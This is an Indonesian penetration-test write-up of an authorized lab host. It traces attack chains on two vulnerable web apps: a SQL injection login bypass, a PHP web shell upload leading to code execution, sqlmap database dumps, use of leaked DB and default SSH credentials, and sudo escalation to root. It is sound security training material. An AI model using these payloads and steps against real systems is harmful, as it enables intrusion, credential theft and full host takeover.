# Write-up Lengkap Praktik Pengujian Celah Keamanan Web

Tanggal: 18 Agustus 2026
Target host: 192.168.56.133
Konteks: lab internal terotorisasi
Fokus aplikasi:
- SIMPEG: http://192.168.56.133:8080
- Fotorecv3: http://192.168.56.133:8082
- Launcher lab: http://192.168.56.133:8084

## 1. Ringkasan Eksekutif

Pengujian terhadap host `192.168.56.133` menunjukkan bahwa environment lab memuat beberapa aplikasi web rentan yang dapat dieksploitasi melalui rantai serangan nyata. Pada aplikasi SIMPEG, jalur serangan berhasil berkembang dari enumerasi awal, SQL Injection pada form login, bypass kontrol otorisasi, unrestricted file upload, Remote Code Execution (RCE) sebagai `www-data`, akses langsung ke database MySQL, pivot ke SSH host melalui kredensial default, hingga privilege escalation ke `root` pada host utama.

Pada aplikasi Fotorecv3, SQL Injection pada parameter `id` berhasil divalidasi dan memungkinkan ekstraksi hash admin dari database. Hash tersebut dapat dipetakan ke password valid, sehingga kompromi admin aplikasi berhasil dicapai. Selain itu, bypass filter ekstensi upload juga tervalidasi. Namun, pada runtime saat pengujian, file yang lolos filter tidak dieksekusi sebagai PHP, sehingga RCE pada Fotorecv3 belum tervalidasi.

Secara keseluruhan, tingkat risiko environment ini sangat tinggi. Jalur kompromi pada SIMPEG telah mencapai kendali administratif penuh terhadap host `ptlabs2026`, sedangkan pada Fotorecv3 telah tercapai pengambilalihan akun admin aplikasi.

## 2. Scope dan Tujuan

### 2.1 Scope
- Host target: `192.168.56.133`
- Aplikasi yang diuji:
  - SIMPEG (`8080`)
  - Fotorecv3 (`8082`)
- Service terkait:
  - SSH (`22`)
  - MySQL (`3307`, `3308`, `3309`)
  - phpMyAdmin (`8081`, `8083`, `8086`)

### 2.2 Tujuan
- Melakukan enumerasi host dan service dari awal
- Memvalidasi challenge/temuan celah keamanan pada aplikasi web
- Menyusun langkah PoC yang dapat direproduksi
- Mengidentifikasi dampak teknis aktual hingga privilege escalation bila memungkinkan

## 3. Metodologi

Tahapan pengujian yang dilakukan:
1. Host discovery
2. Full TCP scan
3. Service dan banner enumeration
4. Pemetaan aplikasi dari launcher lab
5. Validasi celah aplikasi secara bertahap
6. Post-exploitation dan privilege escalation
7. Penyusunan evidence dan write-up

## 4. Discovery Awal

### 4.1 Host discovery
Perintah:

```bash
nmap -sn 192.168.56.0/24
```

Tujuan:
- Mengidentifikasi host aktif pada subnet lab.

Hasil:
- Host `192.168.56.133` terdeteksi aktif.

### 4.2 Full TCP scan
Perintah:

```bash
nmap -Pn -p- --min-rate 1000 192.168.56.133
```

Tujuan:
- Mengidentifikasi seluruh port TCP yang terbuka.

Hasil port terbuka:
- `22/tcp`
- `3307/tcp`
- `3308/tcp`
- `3309/tcp`
- `8080/tcp`
- `8081/tcp`
- `8082/tcp`
- `8083/tcp`
- `8084/tcp`
- `8085/tcp`
- `8086/tcp`

### 4.3 Service detection dan default scripts
Perintah:

```bash
nmap -Pn -sV -sC -p22,3307,3308,3309,8080-8086 192.168.56.133
```

Temuan penting:
- `22/tcp` -> OpenSSH 8.9p1 Ubuntu
- `3307/tcp` -> MySQL 8.0.46
- `3308/tcp` -> MySQL 8.0.46
- `3309/tcp` -> MySQL 8.0.46
- `8080/tcp` -> SIMPEG
- `8081/tcp` -> phpMyAdmin SIMPEG
- `8082/tcp` -> Fotorecv3
- `8083/tcp` -> phpMyAdmin Fotorecv3
- `8084/tcp` -> launcher lab
- `8085/tcp` -> SPMB
- `8086/tcp` -> phpMyAdmin SPMB

## 5. Pemetaan Aplikasi dari Launcher

Dari launcher dan halaman lab, challenge yang relevan adalah:

### SIMPEG
1. SQL Injection — Bypass Login
2. SQL Injection — Ekstrak Data dengan UNION
3. IDOR — Akses Data Pegawai Lain
4. IDOR — Lihat Password User Lain
5. RBAC — Privilege Escalation
6. XSS — Reflected Cross-Site Scripting
7. File Upload — Upload Web Shell

### Fotorecv3
8. SQL Injection — Ekstrak Data Foto
9. Authentication Bypass — Admin Panel
10. File Upload — Bypass Filter Ekstensi

## 6. Write-up Lengkap SIMPEG

### 6.1 Profil target SIMPEG
- URL utama: `http://192.168.56.133:8080`
- Title: `Login - SIMPEG`
- Endpoint penting:
  - `/login.php`
  - `/dashboard.php`
  - `/pegawai_detail.php?id=`
  - `/profile.php?id=`
  - `/users.php`
  - `/upload.php`

### 6.2 Temuan 1 — SQL Injection bypass login

#### Deskripsi
Form login SIMPEG rentan terhadap SQL Injection pada parameter autentikasi, sehingga penyerang dapat memperoleh sesi administrator tanpa mengetahui kredensial sah.

#### Endpoint
- `POST /login.php`

#### Payload tervalidasi
```text
username=' OR '1'='1' -- 
password=x
```

#### Langkah PoC
1. Buka `http://192.168.56.133:8080/login.php`
2. Isi field:
   - username: `' OR '1'='1' -- `
   - password: `x`
3. Submit form login.
4. Amati redirect dan konten dashboard.

#### Evidence
Indikator keberhasilan:
```text
final_url: /dashboard.php
indikator tampilan: Halo, Administrator
```

#### Dampak
- Akses administrator tanpa kredensial sah.
- Menjadi entry point untuk seluruh chain lanjutan.

#### Tingkat risiko
- Kritis

### 6.3 Temuan 2 — SQL Injection / IDOR pada akses data pegawai

#### Deskripsi
Parameter numerik pada halaman detail pegawai dapat dimanipulasi untuk melihat objek lain dan, sesuai challenge, dapat menjadi titik ekstraksi data melalui injeksi query.

#### Endpoint
- `GET /pegawai_detail.php?id=`

#### Langkah PoC dasar
1. Akses `http://192.168.56.133:8080/pegawai_detail.php?id=1`
2. Ubah nilai `id` menjadi objek lain untuk melihat data pegawai berbeda.
3. Uji perubahan respons untuk mengidentifikasi kontrol otorisasi yang lemah.

#### Dampak
- Data pegawai lain dapat diakses di luar otorisasi semestinya.
- Menjadi indikasi broken object level authorization.

#### Tingkat risiko
- Tinggi

### 6.4 Temuan 3 — IDOR pada profil user

#### Deskripsi
Halaman profil dapat diakses dengan referensi objek yang dapat dimanipulasi, sehingga user berpotensi melihat data user lain, termasuk atribut sensitif yang seharusnya tidak ditampilkan.

#### Endpoint
- `GET /profile.php?id=`

#### Langkah PoC dasar
1. Login sebagai user biasa.
2. Akses halaman profil dengan `id` milik user lain.
3. Bandingkan respons untuk memvalidasi kebocoran objek.

#### Dampak
- Kebocoran data sensitif antar user.

#### Tingkat risiko
- Tinggi

### 6.5 Temuan 4 — RBAC bypass

#### Deskripsi
User non-admin masih dapat mengakses halaman manajemen user secara langsung.

#### Endpoint
- `GET /users.php`

#### Kredensial uji yang tervalidasi
- `user1 / user123`

#### Langkah PoC
1. Login sebagai user biasa: `user1 / user123`
2. Akses langsung `http://192.168.56.133:8080/users.php`
3. Amati apakah halaman administratif tetap terbuka.

#### Evidence
- Halaman manajemen user tetap dapat diakses oleh user biasa.

#### Dampak
- Broken authorization
- Potensi akses ke fungsi CRUD user oleh non-admin

#### Tingkat risiko
- Tinggi

### 6.6 Temuan 5 — Unrestricted file upload leading to RCE

#### Deskripsi
Fitur upload memungkinkan file PHP diunggah dan diakses langsung dari web root, yang berujung pada eksekusi perintah sistem.

#### Endpoint
- `POST /upload.php`
- file hasil upload di `/uploads/`

#### Payload file uji
```php
<?php system($_GET['cmd']); ?>
```

#### Langkah PoC
1. Login ke SIMPEG.
2. Buka halaman upload: `http://192.168.56.133:8080/upload.php`
3. Upload file PHP berisi payload web shell.
4. Akses file hasil upload:
   - `http://192.168.56.133:8080/uploads/shell.php?cmd=id`
5. Verifikasi output command.

#### Evidence
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Dampak
- RCE pada server aplikasi dalam konteks `www-data`
- Memungkinkan pembacaan source, env, session, dan eksplorasi lebih lanjut

#### Tingkat risiko
- Kritis

### 6.7 Post-exploitation SIMPEG

#### 6.7.1 Identifikasi konteks eksekusi
Perintah dari web shell:

```bash
id
whoami
uname -a
ps aux | head
hostname
cat /proc/1/cgroup
mount | head
```

Hasil penting:
- konteks: `www-data`
- target berjalan di dalam container Docker
- indikator: overlay filesystem, `/.dockerenv`, hostname container

#### 6.7.2 Pengecekan privesc lokal dalam container
Perintah:

```bash
sudo -l
getcap -r / 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
ls -la /etc/cron*
```

Hasil:
- tidak ada `sudo` yang berguna dari konteks `www-data`
- hanya SUID standar
- tidak ditemukan `docker.sock`
- tidak ditemukan cron writable yang langsung bisa dieksploitasi

Kesimpulan:
- tidak ditemukan jalur privesc cepat langsung di dalam container

### 6.8 Temuan 6 — Kebocoran kredensial database

#### Deskripsi
Environment/source aplikasi mengandung kredensial database dengan hak tinggi.

#### Evidence
Ditemukan nilai berikut:
```text
DB_HOST=simpeg-db
DB_NAME=simulasi_keamanan
DB_USER=root
DB_PASS=rootpassword
```

#### Langkah PoC
1. Dari web shell, baca source atau file konfigurasi aplikasi.
2. Identifikasi parameter koneksi database.
3. Uji koneksi langsung ke service MySQL yang terekspos.

#### Verifikasi akses DB
Perintah:

```bash
mysql --skip-ssl -h 192.168.56.133 -P 3307 -u root -prootpassword -e "USE simulasi_keamanan; SHOW TABLES; SELECT id,username,password,role,nama FROM users;"
```

#### Hasil
- Akses penuh ke database SIMPEG berhasil.
- Tabel `users` dan data backend dapat dibaca.

#### Dampak
- Kompromi total terhadap kerahasiaan dan integritas data aplikasi

#### Tingkat risiko
- Kritis

### 6.9 Temuan 7 — Pivot ke host melalui SSH default credentials

#### Deskripsi
Service SSH host membocorkan petunjuk kredensial default, dan kredensial tersebut valid untuk login host utama.

#### Evidence banner/prompt
```text
User Name: ubuntu
Password: ubuntu (sudo su -)
```

#### Langkah PoC
1. Gunakan SSH client ke host `192.168.56.133`.
2. Login dengan:
   - username: `ubuntu`
   - password: `ubuntu`
3. Verifikasi identitas user setelah login.

#### Evidence
```text
uid=1000(ubuntu) gid=1000(ubuntu)
groups=... 27(sudo) ... 137(docker)
```

#### Dampak
- Shell pada host utama berhasil diperoleh.

#### Tingkat risiko
- Kritis

### 6.10 Temuan 8 — Privilege escalation ke root host

#### Deskripsi
Akun `ubuntu` pada host utama memiliki hak `sudo` tanpa password.

#### Langkah PoC
1. Setelah login sebagai `ubuntu`, jalankan:

```bash
sudo -l
```

2. Verifikasi bahwa hak berikut tersedia:
```text
(ALL : ALL) NOPASSWD: ALL
```

3. Ambil shell/eksekusi root:

```bash
sudo su -c 'id && whoami && hostname'
```

#### Evidence
```text
uid=0(root) gid=0(root) groups=0(root)
whoami -> root
hostname -> ptlabs2026
```

#### Dampak
- Full host compromise
- Kendali administratif penuh terhadap host utama

#### Tingkat risiko
- Kritis

### 6.11 Pencarian flag

#### Langkah yang dilakukan
Sebagai root di host utama, dilakukan pencarian:

```bash
find / -maxdepth 5 \( -iname 'flag*' -o -iname 'user.txt' -o -iname 'root.txt' -o -iname '*proof*' \) 2>/dev/null
grep -RniE 'FLAG\{|CTF\{|flag\{|THM\{|HTB\{' /root /home /opt /srv /var/www /etc 2>/dev/null
```

#### Hasil
- Tidak ditemukan flag eksplisit pada lokasi standar.
- Repo lokal `/home/ubuntu/lab-keamanan-siber/README.md` menunjukkan environment ini adalah lab aplikasi rentan, bukan CTF berbasis file flag.

#### Kesimpulan SIMPEG
Chain serangan tervalidasi penuh:
- SQLi login bypass
- RBAC bypass
- upload web shell
- RCE sebagai `www-data`
- akses DB root
- SSH pivot ke host
- privilege escalation ke `root`

Status akhir:
- Root host berhasil tervalidasi
- Flag eksplisit tidak ditemukan

## 7. Write-up Lengkap Fotorecv3

### 7.1 Profil target Fotorecv3
- URL utama: `http://192.168.56.133:8082`
- Endpoint penting:
  - `/cat.php?id=`
  - `/admin/login.php`
  - `/admin/index.php`
  - `/admin/new.php`
  - `/all.php`

### 7.2 Temuan 1 — SQL Injection pada `cat.php?id=`

#### Deskripsi
Parameter `id` pada halaman kategori rentan terhadap SQL Injection.

#### Uji manual awal
Bandingkan respons untuk:
```text
/cat.php?id=1
/cat.php?id=1 AND 1=1
/cat.php?id=1 AND 1=2
```

#### Hasil
- `1` dan `1 AND 1=1` menghasilkan konten normal
- `1 AND 1=2` mengubah hasil secara signifikan

#### Verifikasi dengan sqlmap
Perintah:

```bash
sqlmap -u "http://192.168.56.133:8082/cat.php?id=1" --batch --technique=UBT --level=2 --risk=1 --tables --threads=2
```

#### Evidence penting
```text
Parameter: id (GET)
Type: boolean-based blind
Type: time-based blind
Type: UNION query
Target URL appears to have 4 columns in query
Database: fotorec
Tables: categories, pictures, users
```

#### Dampak
- Ekstraksi data dari database aplikasi

#### Tingkat risiko
- Kritis

### 7.3 Temuan 2 — Dump hash admin

#### Deskripsi
Melalui SQLi yang tervalidasi, hash password admin dapat diekstrak dari tabel `users`.

#### Perintah PoC
```bash
sqlmap -u "http://192.168.56.133:8082/cat.php?id=1" -D fotorec -T users -C id,login,password --dump --batch --threads=2
```

#### Hasil
```text
+----+-------+----------------------------------+
| id | login | password                         |
+----+-------+----------------------------------+
| 1  | admin | 17b6f89e41157508de1a3bf5f062c07c |
+----+-------+----------------------------------+
```

#### Dampak
- Kredensial admin dapat dipulihkan melalui hash cracking/verifikasi

#### Tingkat risiko
- Tinggi

### 7.4 Temuan 3 — Verifikasi hash dan login admin

#### Verifikasi hash
Perintah:

```bash
python3 - <<'PY'
import hashlib
print(hashlib.md5('p@sswoRd1234'.encode()).hexdigest())
PY
```

Output:
```text
17b6f89e41157508de1a3bf5f062c07c
```

#### Kredensial valid
- `admin / p@sswoRd1234`

#### Langkah PoC login
1. Buka `http://192.168.56.133:8082/admin/login.php`
2. Login dengan kredensial valid di atas
3. Verifikasi redirect ke panel admin

#### Evidence
```text
final_url http://192.168.56.133:8082/admin/index.php
<title>Panel Admin - Lomba Fotografi Nasional 2024</title>
menu: Kelola Karya | Tambah Karya | Logout
```

#### Dampak
- Pengambilalihan akun admin aplikasi

#### Tingkat risiko
- Tinggi

### 7.5 Temuan 4 — Authentication bypass via SQLi pada admin login

#### Deskripsi
Challenge launcher menyebut adanya auth bypass pada panel admin. Namun, payload SQLi login yang diuji tidak berhasil direproduksi pada runtime saat ini.

#### Payload yang diuji
```text
admin' --
admin" --
' OR '1'='1' --
```

#### Hasil runtime
- Seluruh payload gagal menghasilkan sesi admin.
- Aplikasi kembali ke halaman login.

#### Kesimpulan
- Challenge ini kemungkinan mengalami drift antara materi lab dan runtime container aktif.
- Walaupun demikian, dampak setara tetap tercapai melalui dump hash dan login admin valid.

#### Status
- Tidak tervalidasi langsung

### 7.6 Temuan 5 — Bypass filter ekstensi upload

#### Deskripsi
Fitur upload pada panel admin memblokir `.php`, tetapi menerima beberapa ekstensi alternatif.

#### Endpoint
- `/admin/new.php`

#### Perilaku validasi yang diamati
- `.php` -> diblokir dengan pesan `NO PHP!!`
- nama file dibatasi panjang/format tertentu
- file berikut diterima:
  - `abc.pht`
  - `abc.php5`
  - `abc.phar`

#### Langkah PoC
1. Login sebagai admin.
2. Buka halaman upload karya.
3. Upload file dengan ekstensi alternatif di atas.
4. Verifikasi bahwa entri muncul pada daftar karya / `/all.php`.

#### Evidence
```text
INSERT INTO pictures (title, img, cat) VALUES ('tabc.pht','abc.pht','1')
INSERT INTO pictures (title, img, cat) VALUES ('tabc.php5','abc.php5','1')
INSERT INTO pictures (title, img, cat) VALUES ('tabc.phar','abc.phar','1')
```

#### Dampak
- Kontrol validasi upload tidak memadai
- Membuka peluang RCE bila runtime server mengeksekusi ekstensi alternatif

#### Tingkat risiko
- Sedang

### 7.7 Evaluasi RCE upload

#### Langkah uji
1. Akses file hasil upload di `/admin/uploads/`
2. Tambahkan parameter `?cmd=id` untuk menguji eksekusi PHP

#### Hasil
- File ditampilkan sebagai teks mentah
- Tidak dieksekusi oleh runtime PHP pada environment saat ini

#### Kesimpulan Fotorecv3
Chain yang tervalidasi:
- SQLi pada `cat.php?id=`
- dump hash admin
- login admin valid
- bypass filter upload

Chain yang belum tervalidasi:
- auth bypass login via SQLi langsung
- RCE dari file upload

Status akhir:
- Admin compromise berhasil
- RCE belum tervalidasi pada runtime saat ini

## 8. Ringkasan Tingkat Risiko

### 8.1 SIMPEG
| Temuan | Risiko |
|--------|--------|
| SQLi bypass login | Kritis |
| IDOR / akses objek lain | Tinggi |
| RBAC bypass | Tinggi |
| Upload RCE | Kritis |
| Kebocoran kredensial DB root | Kritis |
| SSH default credentials | Kritis |
| Sudo NOPASSWD -> root | Kritis |

### 8.2 Fotorecv3
| Temuan | Risiko |
|--------|--------|
| SQL Injection pada `cat.php?id=` | Kritis |
| Dump hash admin | Tinggi |
| Login admin dari hash valid | Tinggi |
| Bypass filter upload ekstensi | Sedang |
| Auth bypass login SQLi langsung | Tidak tervalidasi |
| RCE upload | Tidak tervalidasi |

## 9. Kesimpulan Akhir

### SIMPEG
Aplikasi SIMPEG memiliki rantai kelemahan yang dapat dieksploitasi secara berurutan hingga mencapai kompromi penuh host. Jalur yang tervalidasi adalah:
- SQL Injection login
- akses administrator
- bypass kontrol otorisasi
- upload web shell
- RCE sebagai `www-data`
- pembacaan kredensial DB root
- akses langsung ke database
- pivot SSH ke host utama
- privilege escalation ke `root`

Ini menjadikan SIMPEG sebagai temuan kritikal dengan dampak maksimum praktis.

### Fotorecv3
Aplikasi Fotorecv3 tervalidasi rentan terhadap SQL Injection yang berujung pada pengambilalihan akun admin. Filter upload juga terbukti lemah terhadap ekstensi alternatif, tetapi eksekusi kode belum dapat dibuktikan pada runtime saat ini. Dengan demikian, tingkat risikonya tetap tinggi, walaupun belum seberat SIMPEG pada kondisi environment aktif.

## 10. Lokasi File Pendukung

Seluruh dokumen berada di:
- `/home/cakgup/pentest-lab/writeup-20260818`

File terkait:
- `writeup-simpeg-chain.md`
- `writeup-fotorecv3-chain.md`
- `laporan-formal-simpeg-id.md`
- `laporan-gabungan-simpeg-fotorecv3.md`
- `lampiran-poc-langkah-demi-langkah.md`
- `writeup-lengkap-poc.md`
